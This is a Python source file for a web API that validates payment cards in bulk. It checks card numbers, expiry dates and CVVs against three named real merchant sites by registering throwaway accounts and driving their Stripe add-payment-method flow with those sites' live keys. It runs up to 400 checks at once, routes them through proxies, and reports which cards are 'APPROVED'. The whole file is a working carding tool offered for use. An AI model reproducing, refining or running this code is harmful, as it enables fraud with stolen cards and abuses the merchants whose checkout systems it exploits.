#!/usr/bin/env python3
"""
Multi-Site Stripe Auth Checker API
Pydroid 3 Compatible | 400 Concurrent | 3 Endpoints: /check, /sc, /st
"""

import asyncio
import aiohttp
import json
import random
import re
import string
import time
import uuid
from datetime import datetime
from typing import Dict, Optional
import sys
import socket
from aiohttp import web

# ========== CONFIGURATION ==========
CONFIG = {
    "max_concurrent": 400,
    "port": 8000,
    "sites": {
        "check": {
            "domain": "handtoolessentials.com",
            "stripe_key": "pk_live_5ZSl1RXFaQ9bCbELMfLZxCsG",
            "guid": "42545704-d6b5-43d2-9f19-24a7ce72b47c2d705d",
            "muid": "44a41e0c-183d-4d5c-ad87-b8056045ebe0690896"
        },
        "sc": {
            "domain": "gilmertrashman.com",
            "stripe_key": "pk_live_51RbUyuEn0qcpabETSjFw7IAGHGtn2JwOsPFuoEyEU6i3e9cI1ikSkkWshVJKgJRIqNpUwXDqPr91PvoVQbMC3C5400CYwRNpce",
            "guid": "42545704-d6b5-43d2-9f19-24a7ce72b47c2d705d",
            "muid": "3a584a18-c77d-4860-8f11-5b88303f0a720c4cca"
        },
        "st": {
            "domain": "associationsmanagement.com",
            "stripe_key": "pk_live_51G1EZyK9D4dVikOmfYZGRMZGn8PZC2L2dPbIKgwj8FIti5a1j3UQDO8XyAJYwL1OTjhLgGNY1T6H6T84eg5PHCB300b223gcNu",
            "guid": "42545704-d6b5-43d2-9f19-24a7ce72b47c2d705d",
            "muid": "47d9f401-36dd-4bc3-bea5-5502732a58587686bd"
        }
    }
}

# ========== COLOR CODES ==========
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[96m'
RESET = '\033[0m'

# ========== REQUEST COUNTER ==========
request_counter = 0

# ========== HELPER FUNCTIONS ==========

def generate_email() -> str:
    """Generate random email for registration."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'

def generate_password() -> str:
    """Generate random password for registration."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=12))

def generate_client_session_id() -> str:
    """Generate random client session ID."""
    return str(uuid.uuid4())

def generate_elements_session_config_id() -> str:
    """Generate random elements session config ID."""
    return str(uuid.uuid4())

def generate_sid() -> str:
    """Generate random sid."""
    return str(uuid.uuid4()).replace('-', '')[:20] + str(random.randint(10000, 99999))

def generate_time_on_page() -> int:
    """Generate random time on page."""
    return random.randint(20000, 50000)

def parse_cc_line(cc_string: str) -> Optional[Dict]:
    """Parse card from various formats."""
    cc_string = cc_string.strip()
    if not cc_string:
        return None
    
    # Remove spaces
    cc_string = cc_string.replace(' ', '')
    
    # Try different separators
    for sep in ['|', ':', ';', '/', '-', ' ']:
        if sep in cc_string:
            parts = [p.strip() for p in cc_string.split(sep) if p.strip()]
            if len(parts) >= 4:
                card_num = None
                month = None
                year = None
                cvv = None
                
                for part in parts:
                    if re.match(r'^\d{15,16}$', part) and not card_num:
                        card_num = part
                    elif re.match(r'^\d{1,2}$', part) and not month:
                        month = part.zfill(2)
                    elif re.match(r'^\d{2,4}$', part) and not year:
                        year = part[-2:] if len(part) > 2 else part
                    elif re.match(r'^\d{3,4}$', part) and not cvv:
                        cvv = part
                
                if card_num and month and year and cvv:
                    return {
                        "number": card_num,
                        "month": month,
                        "year": year,
                        "cvv": cvv,
                        "formatted": f"{card_num}|{month}|{year}|{cvv}"
                    }
    
    # Check if it's already in pipe format
    if re.match(r'^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc_string):
        parts = cc_string.split('|')
        return {
            "number": parts[0],
            "month": parts[1].zfill(2),
            "year": parts[2][-2:] if len(parts[2]) > 2 else parts[2],
            "cvv": parts[3],
            "formatted": cc_string
        }
    
    return None

# ========== PROXY TESTER ==========

async def test_proxy(session, proxy: str) -> tuple:
    """Test if proxy is working"""
    try:
        proxy_url = f"http://{proxy}" if not proxy.startswith(('http://', 'https://')) else proxy
        async with session.get('http://httpbin.org/ip', proxy=proxy_url, timeout=5) as response:
            if response.status == 200:
                data = await response.json()
                return True, "Live", data.get('origin')
            return False, "Dead", None
    except Exception as e:
        return False, "Dead", None

# ========== STRIPE CHECKER BASE CLASS ==========

class StripeChecker:
    """Base class for Stripe card checking"""
    
    def __init__(self, site_config: dict, proxy: str = None):
        self.config = site_config
        self.domain = site_config["domain"]
        self.proxy = proxy
        self.session = None
        self.proxy_url = f"http://{proxy}" if proxy and not proxy.startswith(('http://', 'https://')) else proxy
        self.headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        }
    
    async def __aenter__(self):
        """Create session with connection pooling"""
        conn = aiohttp.TCPConnector(
            limit=0,
            limit_per_host=0,
            ttl_dns_cache=300,
            force_close=False,
            enable_cleanup_closed=True,
            ssl=False
        )
        self.session = aiohttp.ClientSession(connector=conn)
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    def _parse_value(self, data: str, start: str, end: str) -> str:
        """Extract value between start and end strings."""
        try:
            start_pos = data.index(start) + len(start)
            end_pos = data.index(end, start_pos)
            return data[start_pos:end_pos]
        except ValueError:
            return "None"
    
    async def get_register_nonce(self) -> Optional[str]:
        """Extract woocommerce-register-nonce."""
        try:
            url = f"https://{self.domain}/my-account/"
            async with self.session.get(url, headers=self.headers, proxy=self.proxy_url, timeout=15) as res:
                html = await res.text()
                try:
                    return html.split('woocommerce-register-nonce" value="')[1].split('"')[0]
                except:
                    return None
        except Exception:
            return None
    
    async def register_account(self, email: str, password: str, nonce: str) -> bool:
        """Register with email and password."""
        try:
            url = f"https://{self.domain}/my-account/"
            
            post_headers = self.headers.copy()
            post_headers.update({
                "content-type": "application/x-www-form-urlencoded",
                "origin": f"https://{self.domain}",
                "referer": f"https://{self.domain}/my-account/",
            })
            
            data = {
                "email": email,
                "password": password,
                "woocommerce-register-nonce": nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register"
            }
            
            async with self.session.post(url, headers=post_headers, data=data, proxy=self.proxy_url, timeout=15) as res:
                html = await res.text()
                return 'logout' in html.lower() or 'dashboard' in html.lower()
        except Exception:
            return False
    
    async def get_stripe_key(self) -> Optional[str]:
        """Extract Stripe publishable key."""
        try:
            url = f"https://{self.domain}/my-account/add-payment-method/"
            async with self.session.get(url, headers=self.headers, proxy=self.proxy_url, timeout=15) as res:
                html = await res.text()
                match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
                return match.group(0) if match else self.config["stripe_key"]
        except Exception:
            return self.config["stripe_key"]
    
    async def get_setup_intent_nonce(self) -> Optional[str]:
        """Extract createAndConfirmSetupIntentNonce."""
        try:
            url = f"https://{self.domain}/my-account/add-payment-method/"
            async with self.session.get(url, headers=self.headers, proxy=self.proxy_url, timeout=15) as res:
                html = await res.text()
                
                # Try to extract nonce
                nonce = self._parse_value(html, '"createAndConfirmSetupIntentNonce":"', '"')
                
                if nonce and nonce != "None":
                    return nonce
                
                # Try alternate pattern
                if not nonce or nonce == "None":
                    match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
                    if match:
                        return match.group(1)
                
                return None
        except Exception:
            return None
    
    async def create_payment_method(self, stripe_key: str, card_number: str, exp_month: str, exp_year: str, cvv: str, email: str = None) -> Optional[str]:
        """Create Stripe payment method."""
        try:
            url = "https://api.stripe.com/v1/payment_methods"
            
            stripe_headers = {
                "authority": "api.stripe.com",
                "accept": "application/json",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": self.headers["user-agent"]
            }
            
            card_number = card_number.replace(' ', '')
            exp_year = exp_year[-2:] if len(exp_year) > 2 else exp_year
            
            # Generate dynamic values
            client_session_id = generate_client_session_id()
            elements_session_config_id = generate_elements_session_config_id()
            sid = generate_sid()
            time_on_page = generate_time_on_page()
            
            # Build data string (without hcaptcha token)
            data_string = (
                f"type=card&"
                f"card[number]={card_number}&"
                f"card[cvc]={cvv}&"
                f"card[exp_year]={exp_year}&"
                f"card[exp_month]={exp_month}&"
                f"allow_redisplay=unspecified&"
                f"billing_details[address][postal_code]=10080&"
                f"billing_details[address][country]=US&"
                f"payment_user_agent=stripe.js%2Fd68d8e2c5f%3B+stripe-js-v3%2Fd68d8e2c5f%3B+payment-element%3B+deferred-intent&"
                f"referrer=https%3A%2F%2F{self.domain}&"
                f"time_on_page={time_on_page}&"
                f"client_attribution_metadata[client_session_id]={client_session_id}&"
                f"client_attribution_metadata[merchant_integration_source]=elements&"
                f"client_attribution_metadata[merchant_integration_subtype]=payment-element&"
                f"client_attribution_metadata[merchant_integration_version]=2021&"
                f"client_attribution_metadata[payment_intent_creation_flow]=deferred&"
                f"client_attribution_metadata[payment_method_selection_flow]=merchant_specified&"
                f"client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&"
                f"client_attribution_metadata[merchant_integration_additional_elements][0]=payment&"
                f"guid={self.config['guid']}&"
                f"muid={self.config['muid']}&"
                f"sid={sid}&"
                f"key={stripe_key}&"
                f"_stripe_version=2024-06-20"
            )
            
            # Add email if provided
            if email:
                data_string += f"&billing_details[email]={email}"
            
            async with self.session.post(url, headers=stripe_headers, data=data_string, proxy=self.proxy_url, timeout=20) as res:
                response_text = await res.text()
                
                if res.status == 200:
                    try:
                        response = json.loads(response_text)
                        return response.get('id')
                    except:
                        return None
                else:
                    return None
        except Exception as e:
            return None
    
    async def confirm_setup_intent(self, payment_method_id: str, nonce: str) -> dict:
        """Confirm setup intent."""
        try:
            url = f"https://{self.domain}/wp-admin/admin-ajax.php"
            
            ajax_headers = {
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": f"https://{self.domain}",
                "referer": f"https://{self.domain}/my-account/add-payment-method/",
                "user-agent": self.headers["user-agent"],
                "x-requested-with": "XMLHttpRequest"
            }
            
            data_string = f"action=wc_stripe_create_and_confirm_setup_intent&wc-stripe-payment-method={payment_method_id}&wc-stripe-payment-type=card&_ajax_nonce={nonce}"
            
            async with self.session.post(url, headers=ajax_headers, data=data_string, proxy=self.proxy_url, timeout=20) as res:
                response_text = await res.text()
                try:
                    return json.loads(response_text)
                except:
                    return {"success": False, "error": "Failed to parse response"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def check_card(self, card_string: str) -> dict:
        """Complete card checking flow."""
        start_time_val = time.time()
        email = generate_email()
        password = generate_password()
        
        try:
            # Step 1: Get register nonce
            register_nonce = await self.get_register_nonce()
            if not register_nonce:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "REGISTER_NONCE_ERROR",
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
            # Step 2: Register account
            registered = await self.register_account(email, password, register_nonce)
            if not registered:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "REGISTER_FAILED",
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
            # Step 3: Get Stripe key
            stripe_key = await self.get_stripe_key()
            
            # Step 4: Parse card
            parts = card_string.split('|')
            card_number, exp_month, exp_year, cvv = parts
            
            # Step 5: Create payment method
            pm_id = await self.create_payment_method(stripe_key, card_number, exp_month, exp_year, cvv, email)
            if not pm_id:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "PAYMENT_METHOD_FAILED",
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
            # Step 6: Get setup nonce
            setup_nonce = await self.get_setup_intent_nonce()
            if not setup_nonce:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "SETUP_NONCE_ERROR",
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
            # Step 7: Confirm setup intent
            result = await self.confirm_setup_intent(pm_id, setup_nonce)
            
            # Step 8: Parse result - Convert requires_action to declined
            success = result.get('success', False)
            status = result.get('status', '')
            
            if success:
                if status == 'succeeded':
                    return {
                        "cc": card_string[:6] + "..." + card_string[-4:],
                        "status": "APPROVED",
                        "code": "CARD_VALID",
                        "live": True,
                        "pm_id": pm_id[:10] + "..." + pm_id[-6:] if pm_id else None,
                        "time": int((time.time() - start_time_val) * 1000)
                    }
                elif status == 'requires_action':
                    # Convert requires_action to declined
                    return {
                        "cc": card_string[:6] + "..." + card_string[-4:],
                        "status": "DECLINED",
                        "code": "REQUIRES_ACTION",
                        "live": False,
                        "time": int((time.time() - start_time_val) * 1000)
                    }
                else:
                    return {
                        "cc": card_string[:6] + "..." + card_string[-4:],
                        "status": "APPROVED",
                        "code": "CARD_VALID",
                        "live": True,
                        "pm_id": pm_id[:10] + "..." + pm_id[-6:] if pm_id else None,
                        "time": int((time.time() - start_time_val) * 1000)
                    }
            else:
                error_code = "CARD_DECLINED"
                error_msg = json.dumps(result).lower()
                
                if 'insufficient_funds' in error_msg:
                    error_code = "INSUFFICIENT_FUNDS"
                elif 'invalid_cvc' in error_msg:
                    error_code = "INVALID_CVC"
                elif 'expired_card' in error_msg:
                    error_code = "EXPIRED_CARD"
                elif 'incorrect_number' in error_msg:
                    error_code = "INCORRECT_NUMBER"
                
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "DECLINED",
                    "code": error_code,
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
        except Exception as e:
            return {
                "cc": card_string[:6] + "..." + card_string[-4:],
                "status": "ERROR",
                "code": "CHECK_ERROR",
                "error": str(e)[:50],
                "live": False,
                "time": int((time.time() - start_time_val) * 1000)
            }

# ========== API HANDLERS ==========

semaphore = asyncio.Semaphore(CONFIG["max_concurrent"])

async def handle_check(request, site: str):
    """Generic handler for card checking endpoints"""
    global request_counter
    request_counter += 1
    current_id = request_counter
    
    cc_param = request.query.get('cc', '')
    proxy_param = request.query.get('proxy', None)
    
    if not cc_param:
        return web.json_response({
            "error": "Missing cc parameter",
            "usage": f"/{site}?cc=4111111111111111|12|25|123&proxy=127.0.0.1:8080"
        }, status=400)
    
    # Parse card
    parsed_card = parse_cc_line(cc_param)
    if not parsed_card:
        return web.json_response({
            "error": "Invalid card format",
            "example": "4111111111111111|12|25|123"
        }, status=400)
    
    # Test proxy if provided
    proxy_status = "Not used"
    if proxy_param:
        try:
            async with aiohttp.ClientSession() as test_session:
                is_live, status_msg, proxy_ip = await test_proxy(test_session, proxy_param)
                proxy_status = status_msg
                
                if not is_live:
                    return web.json_response({
                        "request_id": current_id,
                        "cc": parsed_card["formatted"],
                        "site": site,
                        "status": "ERROR",
                        "code": "PROXY_DEAD",
                        "live": False,
                        "time": 0
                    })
                print(f"{BLUE}[{current_id}] {site.upper()} | Proxy: {proxy_param} - {proxy_status}{RESET}")
        except Exception as e:
            proxy_status = "Test failed"
    
    # Use semaphore for concurrency control
    async with semaphore:
        print(f"{YELLOW}[{current_id}] {site.upper()} | Processing: {parsed_card['formatted'][:16]}... Proxy: {proxy_param if proxy_param else 'None'}{RESET}")
        
        try:
            async with StripeChecker(CONFIG["sites"][site], proxy_param) as checker:
                result = await checker.check_card(parsed_card["formatted"])
                
                # Add metadata
                result["request_id"] = current_id
                result["proxy_status"] = proxy_status
                result["site"] = site
                
                # Color code based on status
                if result['status'] == 'APPROVED':
                    print(f"{GREEN}[{current_id}] {site.upper()} | ✅ APPROVED - {result['code']}{RESET}")
                elif result['status'] == 'DECLINED':
                    print(f"{RED}[{current_id}] {site.upper()} | ❌ DECLINED - {result['code']}{RESET}")
                else:
                    print(f"{RED}[{current_id}] {site.upper()} | ❌ ERROR - {result['code']}{RESET}")
                
                return web.json_response(result)
                
        except Exception as e:
            return web.json_response({
                "request_id": current_id,
                "cc": parsed_card["formatted"],
                "site": site,
                "status": "ERROR",
                "code": "API_ERROR",
                "error": str(e)[:50],
                "live": False,
                "time": 0
            }, status=500)

# Endpoint handlers
async def check_handler(request):
    """Handle /check?cc=... requests"""
    return await handle_check(request, "check")

async def sc_handler(request):
    """Handle /sc?cc=... requests"""
    return await handle_check(request, "sc")

async def st_handler(request):
    """Handle /st?cc=... requests"""
    return await handle_check(request, "st")

async def health_handler(request):
    """Simple health check endpoint."""
    return web.json_response({
        "status": "online",
        "service": "Multi-Site Stripe Checker API",
        "version": "3.0",
        "endpoints": ["/check", "/sc", "/st"],
        "max_concurrent": CONFIG["max_concurrent"],
        "active_requests": CONFIG["max_concurrent"] - semaphore._value if hasattr(semaphore, '_value') else 0
    })

async def root_handler(request):
    """Root endpoint with instructions."""
    return web.json_response({
        "name": "Multi-Site Stripe Checker API",
        "version": "3.0",
        "features": [
            "3 endpoints: /check, /sc, /st",
            "Proxy support with validation",
            "400 concurrent requests",
            "Requires_action converted to declined"
        ],
        "endpoints": {
            "/check?cc={card}&proxy={optional}": "Check card on handtoolessentials.com",
            "/sc?cc={card}&proxy={optional}": "Check card on gilmertrashman.com",
            "/st?cc={card}&proxy={optional}": "Check card on associationsmanagement.com",
            "/health": "Check API status"
        },
        "examples": {
            "check": "/check?cc=4111111111111111|12|25|123",
            "sc": "/sc?cc=4111111111111111|12|25|123&proxy=127.0.0.1:8080",
            "st": "/st?cc=4111111111111111|12|25|123&proxy=user:pass@host:port"
        },
        "concurrency": f"Up to {CONFIG['max_concurrent']} simultaneous checks"
    })

# ========== MAIN ==========

async def main():
    """Start the API server."""
    print(f"{BLUE}")
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║         MULTI-SITE STRIPE CHECKER API v3.0                  ║")
    print("║         3 Endpoints: /check | /sc | /st                     ║")
    print("║         400 Concurrent | Proxy Support                      ║")
    print("║         Requires_action → Declined                          ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(f"{RESET}")
    
    # Get local IP for network access
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except:
        local_ip = "127.0.0.1"
    
    # Setup app
    app = web.Application()
    app.router.add_get('/', root_handler)
    app.router.add_get('/check', check_handler)
    app.router.add_get('/sc', sc_handler)
    app.router.add_get('/st', st_handler)
    app.router.add_get('/health', health_handler)
    
    print(f"{GREEN}✅ Server started successfully!{RESET}")
    print(f"{YELLOW}📱 Local: http://localhost:{CONFIG['port']}{RESET}")
    print(f"{YELLOW}🌐 Network: http://{local_ip}:{CONFIG['port']}{RESET}")
    print(f"{BLUE}🚀 Max concurrent: {CONFIG['max_concurrent']}{RESET}")
    print(f"{GREEN}📝 Endpoints:{RESET}")
    print(f"   • /check - handtoolessentials.com")
    print(f"   • /sc - gilmertrashman.com")
    print(f"   • /st - associationsmanagement.com")
    print(f"   • /health - Status check")
    print(f"{YELLOW}⚠️  requires_action → DECLINED{RESET}\n")
    
    # Start server
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', CONFIG["port"])
    await site.start()
    
    # Keep running
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}⚠️ Server stopped by user{RESET}")
    except Exception as e:
        print(f"\n{RED}❌ Fatal error: {e}{RESET}")